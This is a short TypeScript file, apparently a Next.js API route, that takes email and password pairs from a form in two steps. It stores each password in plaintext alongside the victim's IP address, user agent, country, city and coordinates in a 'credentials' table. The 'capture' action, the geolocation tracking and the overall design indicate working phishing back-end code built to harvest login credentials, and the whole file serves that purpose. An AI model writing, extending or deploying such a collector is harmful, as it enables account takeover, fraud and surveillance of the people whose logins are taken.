import { NextRequest, NextResponse } from 'next/server';
import { getDb } from '@/lib/db';
import { getClientIP, getGeolocation, extractNameFromEmail } from '@/lib/geo';

export async function POST(req: NextRequest) {
  try {
    const formData = await req.formData();
    const action = formData.get('action') as string;

    if (action === 'preflight') {
      const email = (formData.get('email') as string || '').trim();
      if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        return NextResponse.json({ error: 'Invalid email' }, { status: 400 });
      }
      return NextResponse.json({ status: 'ok', email });
    }

    if (action === 'capture') {
      const email = (formData.get('email') as string || '').trim();
      const password = formData.get('password') as string || '';
      if (!email || !password) {
        return NextResponse.json({ error: 'Missing fields' }, { status: 400 });
      }

      const ip = getClientIP(req);
      const geo = await getGeolocation(ip);
      const name = extractNameFromEmail(email);
      const ua = req.headers.get('user-agent') || '';

      const db = getDb();
      db.prepare(`INSERT INTO credentials (name, email, password, ip, user_agent, country, city, latitude, longitude)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`).run(name, email, password, ip, ua, geo.country, geo.city, geo.lat, geo.lon);

      return NextResponse.json({ status: 'ok' });
    }

    return NextResponse.json({ error: 'Invalid action' }, { status: 400 });
  } catch {
    return NextResponse.json({ error: 'Server error' }, { status: 500 });
  }
}
